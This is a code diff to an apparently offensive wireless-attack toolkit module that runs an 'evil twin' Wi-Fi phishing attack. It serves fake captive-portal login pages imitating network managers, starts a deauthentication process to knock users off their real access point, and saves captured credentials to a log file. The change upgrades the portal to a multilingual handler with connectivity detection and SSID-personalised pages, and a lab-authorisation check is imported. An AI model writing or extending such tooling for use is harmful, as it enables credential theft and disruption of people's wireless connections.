@@ -21,7 +21,7 @@ Phishing template variants:
   - wifi_connect       OS Network Manager imitation
   - custom             User-provided HTML directory
 
-Version: 1.0.0
+Version: 2.0.0
 """
 
 from __future__ import annotations
@@ -40,6 +40,10 @@ from urllib.parse import parse_qs
 from wirelessxpl.core.exploit import *
 
 from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+from wirelessxpl.modules.generic.wifi_lab._i18n_service import (
+    I18nPortalHandler,
+    SUPPORTED_LOCALES,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -241,12 +245,17 @@ class Exploit(Exploit):
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
         )
 
-        CredentialHandler.template_dir = str(tpl_dir)
-        CredentialHandler.credentials_log = Path(".log") / "evil_twin_creds.json"
-        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), CredentialHandler)
+        I18nPortalHandler.template_dir = tpl_dir
+        I18nPortalHandler.cred_log = Path(".log") / "evil_twin_creds.json"
+        I18nPortalHandler.portal_host = "10.0.0.1"
+        I18nPortalHandler.connectivity_detect = True
+        I18nPortalHandler.extra_vars = {"ssid": ssid} if ssid else {}
+
+        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
         http_thread = threading.Thread(target=server.serve_forever, daemon=True)
         http_thread.start()
-        print_info("Captive portal serving on port {}".format(self.portal_port))
+        print_info("Captive portal (i18n) on port {} — locales: {}".format(
+            self.portal_port, ", ".join(SUPPORTED_LOCALES)))
 
         deauth_proc = self._start_deauth()
 
@@ -265,7 +274,7 @@ class Exploit(Exploit):
                 deauth_proc.terminate()
                 deauth_proc.wait(timeout=5)
 
-        cred_log = CredentialHandler.credentials_log
+        cred_log = I18nPortalHandler.cred_log
         if cred_log.exists():
             count = sum(1 for _ in open(cred_log, encoding="utf-8"))
             print_success("Captured {} credential entries → {}".format(count, cred_log))
